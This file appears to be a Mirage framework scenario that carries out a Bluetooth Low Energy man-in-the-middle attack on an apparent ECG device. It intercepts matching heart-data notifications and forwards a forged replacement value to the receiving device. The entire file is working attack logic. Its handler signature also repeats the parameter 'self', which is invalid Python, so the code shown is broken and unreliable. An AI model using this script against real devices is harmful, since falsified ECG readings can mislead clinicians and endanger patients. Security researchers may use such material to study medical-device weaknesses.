from mirage.core import scenario
from mirage.libs import io, ble, bt, utils

class ecg(scenario.Scenario):

    def onStart(self):
        # This signal is triggered when the module starts
        self.a2sEmitter = self.module.a2sEmitter  # Attacker to Slave emitter
        self.a2sReceiver = self.module.a2sReceiver  # Attacker to Slave receiver
        self.a2mEmitter = self.module.a2mEmitter  # Attacker to Master emitter
        self.a2mReceiver = self.module.a2mReceiver  # Attacker to Master receiver
        return True  # The default behaviour is executed

    def onSlaveHandleValueNotification(self, self, packet):
        if packet.handle == 0xe and 0xff in packet.value and 0x12 in packet.value and 0x0f in packet.value and 0x11 in packet.value and 0x10 in packet.value:

            packet.show()
            newValue = bytes.fromhex("ff120f114e11531153115d11621162115d114a65")

            io.info("---------> MITM Attack Occurred ----> Value modified (New value: "+newValue.hex()+")!")
            self.a2mEmitter.sendp(ble.BLEHandleValueNotification(handle=packet.handle, value=newValue))
            return False  # The default behaviour is not executed
        else:
            return True  # The default behaviour is executed

    def onEnd(self):
        return True  # The default behaviour is executed
